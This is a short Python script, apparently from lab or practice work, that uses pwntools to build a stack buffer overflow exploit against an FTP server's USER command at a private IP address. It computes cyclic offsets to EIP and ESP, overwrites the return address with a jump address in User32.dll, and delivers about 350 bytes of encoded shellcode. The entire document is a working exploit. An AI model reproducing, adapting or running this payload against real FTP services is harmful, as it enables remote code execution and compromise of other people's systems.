from pwn import * 

ip = "192.168.15.172"
port = 21

cmd = "USER "
offset_to_eip = 230 + len(cmd) #pwn cyclic -l 0x61696361
offset_to_esp = 247 #pwn cyclic -l cmaa, eip as cafebabe to test
new_eip =  0x776D4E5B #had to search manually 776D4E5B at User32.dll (Why didn't randomize the address??)

#size=361
shellcode =  b"\x90"*10
shellcode += b"\xbb\x88\xf9\x1b\xc1\xd9\xed\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc"
shellcode += b"\x03\xd2\xf7\xf9\x34\x1e\xef\x7c\xb6\xde\xf0"
shellcode += b"\xe0\x3e\x3b\xc1\x20\x24\x48\x72\x91\x2e\x1c"
shellcode += b"\x7f\x5a\x62\xb4\xf4\x2e\xab\xbb\xbd\x85\x8d"
shellcode += b"\xf2\x3e\xb5\xee\x95\xbc\xc4\x22\x75\xfc\x06"
shellcode += b"\x37\x74\x39\x7a\xba\x24\x92\xf0\x69\xd8\x97"
shellcode += b"\x4d\xb2\x53\xeb\x40\xb2\x80\xbc\x63\x93\x17"
shellcode += b"\xb6\x3d\x33\x96\x1b\x36\x7a\x80\x78\x73\x34"
shellcode += b"\x3b\x4a\x0f\xc7\xed\x82\xf0\x64\xd0\x2a\x03"
shellcode += b"\x74\x15\x8c\xfc\x03\x6f\xee\x81\x13\xb4\x8c"
shellcode += b"\x5d\x91\x2e\x36\x15\x01\x8a\xc6\xfa\xd4\x59"
shellcode += b"\xc4\xb7\x93\x05\xc9\x46\x77\x3e\xf5\xc3\x76"
shellcode += b"\x90\x7f\x97\x5c\x34\xdb\x43\xfc\x6d\x81\x22"
shellcode += b"\x01\x6d\x6a\x9a\xa7\xe6\x87\xcf\xd5\xa5\xcf"
shellcode += b"\x3c\xd4\x55\x10\x2b\x6f\x26\x22\xf4\xdb\xa0"
shellcode += b"\x0e\x7d\xc2\x37\x70\x54\xb2\xa7\x8f\x57\xc3"
shellcode += b"\xee\x4b\x03\x93\x98\x7a\x2c\x78\x58\x82\xf9"
shellcode += b"\x2f\x08\x2c\x52\x90\xf8\x8c\x02\x78\x12\x03"
shellcode += b"\x7c\x98\x1d\xc9\x15\x33\xe4\x9a\xd9\x6c\xe9"
shellcode += b"\x0f\xb2\x6e\xf5\xbe\x1e\xe6\x13\xaa\x8e\xae"
shellcode += b"\x8c\x43\x36\xeb\x46\xf5\xb7\x21\x23\x35\x33"
shellcode += b"\xc6\xd4\xf8\xb4\xa3\xc6\x6d\x35\xfe\xb4\x38"
shellcode += b"\x4a\xd4\xd0\xa7\xd9\xb3\x20\xa1\xc1\x6b\x77"
shellcode += b"\xe6\x34\x62\x1d\x1a\x6e\xdc\x03\xe7\xf6\x27"
shellcode += b"\x87\x3c\xcb\xa6\x06\xb0\x77\x8d\x18\x0c\x77"
shellcode += b"\x89\x4c\xc0\x2e\x47\x3a\xa6\x98\x29\x94\x70"
shellcode += b"\x76\xe0\x70\x04\xb4\x33\x06\x09\x91\xc5\xe6"
shellcode += b"\xb8\x4c\x90\x19\x74\x19\x14\x62\x68\xb9\xdb"
shellcode += b"\xb9\x28\xd9\x39\x6b\x45\x72\xe4\xfe\xe4\x1f"
shellcode += b"\x17\xd5\x2b\x26\x94\xdf\xd3\xdd\x84\xaa\xd6"
shellcode += b"\x9a\x02\x47\xab\xb3\xe6\x67\x18\xb3\x22"


payload = fit({
	0:cmd,
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	}, length=700)

conn = remote(ip,port)
conn.readline()
conn.sendline(payload)
